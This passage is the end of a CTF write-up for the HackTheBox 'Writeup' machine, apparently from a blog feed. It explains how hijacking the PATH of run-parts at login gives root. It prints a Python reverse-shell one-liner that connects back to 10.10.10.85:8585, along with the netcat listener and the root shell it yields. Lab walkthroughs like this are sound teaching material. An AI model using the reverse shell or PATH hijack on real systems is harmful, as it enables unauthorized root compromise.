/etc/update-motd.d</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ man run-parts</span><br><span class="line">run-parts runs all the executable files named within constraints described below, found <span class="keyword">in</span> directory [directory].</span><br></pre></td></tr></table></figure><p>Sounds promising. If we can add a script to <code>/etc/update-motd.d</code> it will be executed as root on next login. </p><p>Unfortunately we don’t have writting rights to <code>/etc/update-motd.d</code> nor to the file present in it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jkr@writeup:~$ ls -l /etc/update-motd.d/</span><br><span class="line">total 4</span><br><span class="line">-rwxr-xr-x 1 root root 23 Jun  3  2018 10-uname</span><br></pre></td></tr></table></figure><p>That looks like a dead end here. </p><p>Another thing we noticed is that executable are called in relative path and not absolute. And the first command gives the full <code>PATH</code> env variable before launching the <code>run-parts</code> command.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c /usr/bin/env -i PATH=/usr/<span class="built_in">local</span>/sbin:/usr/<span class="built_in">local</span>/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &gt; /run/motd.dynamic.new </span><br></pre></td></tr></table></figure><p>As a reminder, when a command is called Linux will search in the <code>PATH</code> environement variable to find where this executable is located. So in the command above, Linux system will first look in the <code>/usr/local/sbin</code> to see if <code>run-parts</code> is there, then in <code>/usr/local/bin</code> etc… </p><p>Let’s check where <code>run-parts</code> is : </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jkr@writeup:~$ <span class="built_in">which</span> run-parts</span><br><span class="line">/bin/run-parts</span><br></pre></td></tr></table></figure><p>So it’s <code>/bin/</code> folder, the last on the <code>PATH</code> list. That mean if we can write an executable named <code>run-parts</code> in either : </p><ul><li><code>/usr/local/sbin/</code></li><li><code>/usr/local/bin/</code></li><li><code>/usr/sbin/</code></li><li><code>/usr/bin/</code></li><li><code>/sbin/</code></li></ul><p>then it will be ran instead of the real <code>/bin/run-parts</code> and as root. If we have writting rights in any of those folder then it’s bingo.</p><h3 id="Privilege-escalation"><a href="#Privilege-escalation" class="headerlink" title="Privilege escalation"></a>Privilege escalation</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Bash reserve shell doesn&#x27;t work, let&#x27;s use the python one</span></span><br><span class="line">jkr@writeup:~$ cat /usr/<span class="built_in">local</span>/sbin/run-parts </span><br><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.10.85&quot;,8585));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br><span class="line">jkr@writeup:~$ chmod +x /usr/<span class="built_in">local</span>/sbin/run-parts</span><br><span class="line">jkr@writeup:~$</span><br></pre></td></tr></table></figure><p>Let’s listen to incoming connection :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure><p>Now we logout and login again to the box to initiate the <code>sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &gt; /run/motd.dynamic.new </code> command.</p><p>And surely we receive the connection immediatly :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.138:37078</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"><span class="comment"># cat /root/root.txt</span></span><br><span class="line">eeba4xxxxxxxxxxxx8d7226</span><br></pre></td></tr></table></figure><p>That’s it! As always do not hesitate to contact me for any questions or feedbacks. </p><p>See you next time !</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
          <category> Easy Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> sqli </tag>
            
            <tag> exploit </tag>
            
            <tag> run-parts </tag>
            
            <tag> writeup </tag>
            
            <tag> cmsms </tag>
            
            <tag> injection </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
